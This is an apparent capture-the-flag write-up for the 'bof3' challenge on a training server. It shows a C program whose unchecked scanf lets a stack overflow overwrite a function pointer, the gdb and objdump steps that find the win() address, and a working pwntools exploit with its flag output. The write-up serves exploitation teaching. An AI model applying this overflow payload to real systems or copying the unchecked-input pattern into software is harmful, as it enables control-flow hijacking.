Let's take a look at the source code...

```
#include <stdio.h>
#include <stdlib.h>
#include "pwnable_harness.h"

void win(void) {
	char flag[64];
	
	FILE* fp = fopen("flag.txt", "r");
	if(!fp) {
		puts("error, contact admin");
		exit(0);
	}
	
	fgets(flag, sizeof(flag), fp);
	fclose(fp);
	puts(flag);
}

void lose(void) {
	puts("you suck!\n");
	fflush(stdout);
	exit(0);
}

void handle_connection(int sock) {
	void (*fp)(); 
	char bof[64];
	
	fp = &lose;
	
	scanf("%s",bof);
	fp();
}


int main(int argc, char** argv) {
	/* Defaults: Run on port 9002 for 30 seconds as user "ctf_bof3" in a chroot */
	server_options opts = {
		.user = "ctf_bof3",
		.chrooted = true,
		.port = 9002,
		.time_limit_seconds = 30
	};
	
	return server_main(argc, argv, opts, &handle_connection);
}
```

Looking at this code, I see the same vulnerabillity that bof2 had (and when we run it, it has the same functionallity from a user standpoint). The difference here is that there isn't an if then statement, but a variable executed as a function.
We can override that variable so it will execute a function that we want, like win(). I'm going to go out on a limb here and say that since this exploit is so similar to bof2, that the distance is probably going to be 64.
If that is true, then all we will need besides that is the address of the win function. We can get that by either using gdb...


```
guyinatuxedo@tux:/Hackery/ctf/ucf/pwn/bof3$ gdb ./bof3
gdb-peda$ print win
$1 = {<text variable, no debug info>} 0x80486eb <win>
```

Or we could use objdect dump (t flag means symbols)

```
guyinatuxedo@tux:/Hackery/ctf/ucf/pwn/bof3$ objdump -t ./bof3 | grep win
080486eb g     F .text	00000072              win
```

Either way, we get the address of the win() function which is "0x80486eb". Knowing this we can now code an exploit in python.

```
#Import pwntools
from pwn import *

#Establish the remote connection
conn = remote('ctf.hackucf.org', 9002)

#Make the payload, make sure to have the hex address in little endian
exploit = "0"*64 + "\xeb\x86\x04\x08"

#Send the payload
conn.sendline(exploit)

#Print the flag
print conn.recvline()
```

And now to run the exploit.

```
guyinatuxedo@tux:/Hackery/ctf/ucf/pwn/bof3$ python exploit.py 
[+] Opening connection to ctf.hackucf.org on port 9002: Done
flag{time_to_get_out_of_the_kiddie_pool}

[*] Closed connection to ctf.hackucf.org port 9002
```

And just like that, we pwned the elf...

